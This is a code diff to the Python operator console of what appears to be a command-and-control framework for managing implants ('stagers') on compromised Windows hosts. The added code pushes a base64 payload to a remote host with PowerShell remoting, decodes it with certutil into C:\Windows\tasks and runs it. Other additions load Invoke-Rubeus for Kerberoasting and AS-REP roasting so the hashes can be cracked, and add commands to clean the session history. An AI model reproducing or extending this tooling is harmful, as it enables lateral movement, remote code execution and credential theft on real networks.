@@ -250,8 +250,7 @@ class mymainclass():
                     if user_input_stager not in self.__t_myserver.get_stager():
                         print("Please input a valid stager uuid")
                         continue
-                    for each_msg in self.__t_myserver.get_history()[user_input_stager]:
-                        print(each_msg)
+                    self.__t_myserver.print_history(user_input_stager,False)
                     continue
 
                 if command_id == self.__t_myconstant.CMD_STAGER_GET_INTO:
@@ -398,7 +397,35 @@ class mymainclass():
 
                     self.__t_myserver.create_command(user_input_stager,"fwc","{}:{}:{}".format(rhuuid,user_input_con_host,user_input_con_port))
                     threading.Thread(target=self.__t_myserver.start_resource_handler,args=(user_input_stager,rhuuid)).start()
+                    continue
 
+                if command_id == self.__t_myconstant.CMD_STAGER_CLEAN_HISTORY:
+                    #set auto compete to stager uuid
+                    setautocomplete(self.__t_myserver.get_running_stager())
+
+                    user_input_stager = input("Please enter the stager uuid: ")
+                    if user_input_stager not in self.__t_myserver.get_running_stager():
+                        print("Please input a valid stager uuid")
+                        continue
+                    removecomplete()
+
+                    user_input_id = input("Please enter the history id to clean: ")
+                    self.__t_myserver.clean_history(user_input_stager,int(user_input_id))
+                    continue
+
+                if command_id == self.__t_myconstant.CMD_STAGER_RESTORE_HISTORY:
+                    #set auto compete to stager uuid
+                    setautocomplete(self.__t_myserver.get_running_stager())
+
+                    user_input_stager = input("Please enter the stager uuid: ")
+                    if user_input_stager not in self.__t_myserver.get_running_stager():
+                        print("Please input a valid stager uuid")
+                        continue
+                    removecomplete()
+
+                    user_input_id = input("Please enter the history id to restore: ")
+                    self.__t_myserver.restore_history(user_input_stager,int(user_input_id))
+                    continue
 
 
             if cmd_tag == self.__t_myconstant.TAG_STAGER_TOOLS:
@@ -557,6 +584,9 @@ class mymainclass():
                     continue
                 
                 if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_MAKETOKEN:
+                    #disable verbose
+                    self.__t_myserver.set_verbose(False)
+                    
                     #set auto compete to stager uuid
                     setautocomplete(self.__t_myserver.get_running_stager())
 
@@ -587,6 +617,9 @@ class mymainclass():
 
                     self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.OPH_INIT)
                     self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.OPH_NEWTOKEN.format(user_input_username,user_input_domain,user_input_password))
+                    
+                    #enable verbose
+                    self.__t_myserver.set_verbose(True)
                     continue
 
                 if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_PSRESET:
@@ -672,8 +705,7 @@ class mymainclass():
                     if user_input_stager not in self.__t_myserver.get_stager():
                         print("Please input a valid stager uuid")
                         continue
-                    for each_msg in self.__t_myserver.get_history()[user_input_stager]:
-                        print(each_msg)
+                    self.__t_myserver.print_history(user_input_stager,False)
                     continue
                 
                 if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_GETDOMAIN:
@@ -708,6 +740,9 @@ class mymainclass():
                     continue
 
                 if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_CD:
+                    #disable verbose
+                    self.__t_myserver.set_verbose(False)
+
                     #set auto compete to stager uuid
                     setautocomplete(self.__t_myserver.get_running_stager())
 
@@ -725,6 +760,9 @@ class mymainclass():
 
                     self.__t_myserver.create_command(user_input_stager,"ps","cd {}".format(user_input_path))
                     self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.NET_CD)
+                    
+                    #enable verbose
+                    self.__t_myserver.set_verbose(True)
                     continue
                 
                 if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_DOWNLOAD:
@@ -767,6 +805,9 @@ class mymainclass():
                     continue
 
                 if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_PSJUMP:
+                    #disable verbose
+                    self.__t_myserver.set_verbose(False)
+
                     #re-generate payload 
                     t_mypayloadgen = payloadgen.mypayloadgen()
                     if self.__t_mypayload.payloadtype == "socket":
@@ -798,9 +839,15 @@ class mymainclass():
                     self.__t_myserver.create_command(user_input_stager,"psload",t_result)
                     self.__t_myserver.add_psloadlist(user_input_stager,"Invoke-myclient.ps1")
                     self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.PSJOB.format("Invoke-myclient"))
+                    
+                    #enable verbose
+                    self.__t_myserver.set_verbose(True)
                     continue
 
                 if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_SPAWN_PS:
+                    #disable verbose
+                    self.__t_myserver.set_verbose(False)
+
                     #re-generate payload 
                     t_mypayloadgen = payloadgen.mypayloadgen()
                     if self.__t_mypayload.payloadtype == "socket":
@@ -826,6 +873,9 @@ class mymainclass():
                         print("Payload already loaded")
                     
                     self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.PSJOB.format("Invoke-myclient"))
+                    
+                    #enable verbose
+                    self.__t_myserver.set_verbose(True)
                     continue
 
                 if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_WHOAMI:
@@ -852,6 +902,102 @@ class mymainclass():
                     self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.HOSTNAME)
                     continue
 
+                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_PSJUMP_EXE:
+                    #disable verbose
+                    self.__t_myserver.set_verbose(False)
+
+                    #re-generate payload 
+                    t_mypayloadgen = payloadgen.mypayloadgen()
+                    if self.__t_mypayload.payloadtype == "socket":
+                        t_mypayloadgen.set_config(self.__t_mypayload.payloadtype,self.__t_mypayload.ifreverse,self.__t_mypayload.host,self.__t_mypayload.port)
+                    else:
+                        t_mypayloadgen.set_config(self.__t_mypayload.payloadtype,self.__t_mypayload.ifreverse,self.__t_mypayload.namepipehost,self.__t_mypayload.namepipe)
+                    tosend = t_mypayloadgen.gen_b64()
+                    
+                    #set auto compete to stager uuid
+                    setautocomplete(self.__t_myserver.get_running_stager())
+
+                    user_input_stager = input("Please enter the stager uuid: ")
+                    if user_input_stager not in self.__t_myserver.get_running_stager():
+                        print("Please input a valid stager uuid")
+                        continue
+
+                    t_name = uuid.uuid4().hex[:6].upper()
+
+                    removecomplete()
+                    user_input_target = input("Please enter hostname: ")
+                    user_input_path = input("Please enter path to put the files: ") #default Windows\\tasks
+                    if len(user_input_path) == 0:
+                        user_input_path = "C:\\Windows\\tasks"
+                    user_input_confirm = input("y to continue: ")
+                    if user_input_confirm != "y":
+                        continue
+                    
+                    self.__t_myserver.create_command(user_input_stager,"psremote",self.__t_mybuildin.PSREMOTE.format(user_input_target))
+                    self.__t_myserver.clean_psloadlist(user_input_stager)
+
+                    self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.B64_SAVE.format(tosend,user_input_path,t_name))
+                    self.__t_myserver.create_command(user_input_stager,"ps","certutil -decode {} {}".format(os.path.join(user_input_path,"{}.txt".format(t_name)),os.path.join(user_input_path,"{}.exe".format(t_name))))
+                    self.__t_myserver.create_command(user_input_stager,"ps","Start-Process {}".format(os.path.join(user_input_path,"{}.exe".format(t_name))))
+                    
+                    #enable verbose
+                    self.__t_myserver.set_verbose(True)
+                    continue
+
+                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_KERBER:
+                    #set auto compete to stager uuid
+                    setautocomplete(self.__t_myserver.get_running_stager())
+
+                    user_input_stager = input("Please enter the stager uuid: ")
+                    if user_input_stager not in self.__t_myserver.get_running_stager():
+                        print("Please input a valid stager uuid")
+                        continue
+                    
+                    if ("Invoke-Rubeus.ps1" not in self.__t_myserver.get_psloadlist(user_input_stager)):
+
+                        #load ps
+                        t_psloader = ps_loader()
+                        t_result = t_psloader.load_ps("Invoke-Rubeus.ps1")
+                        #call psrun with tag psload
+                        self.__t_myserver.create_command(user_input_stager,"psload",t_result)
+                        #update the list
+                        self.__t_myserver.add_psloadlist(user_input_stager,"Invoke-Rubeus.ps1")
+                    
+                    else:
+                        print("Rubeus already loaded")
+
+                    self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.KERBER)
+                    continue
+
+                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_ASREP:
+                    #set auto compete to stager uuid
+                    setautocomplete(self.__t_myserver.get_running_stager())
+
+                    user_input_stager = input("Please enter the stager uuid: ")
+                    if user_input_stager not in self.__t_myserver.get_running_stager():
+                        print("Please input a valid stager uuid")
+                        continue
+
+                    if ("Invoke-Rubeus.ps1" not in self.__t_myserver.get_psloadlist(user_input_stager)):
+
+                        #load ps
+                        t_psloader = ps_loader()
+                        t_result = t_psloader.load_ps("Invoke-Rubeus.ps1")
+                        #call psrun with tag psload
+                        self.__t_myserver.create_command(user_input_stager,"psload",t_result)
+                        #update the list
+                        self.__t_myserver.add_psloadlist(user_input_stager,"Invoke-Rubeus.ps1")
+                    
+                    else:
+                        print("Rubeus already loaded")
+
+                    user_input_confirm = input("y for john, default hashcat: ")
+                    if user_input_confirm != "y":
+                        self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.ARSREP_HC)
+                    else:
+                        self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.ARSREP)
+
+                    continue
 
             if cmd_tag == self.__t_myconstant.TAG_PIPE_LISTENER:
                 # menu switch
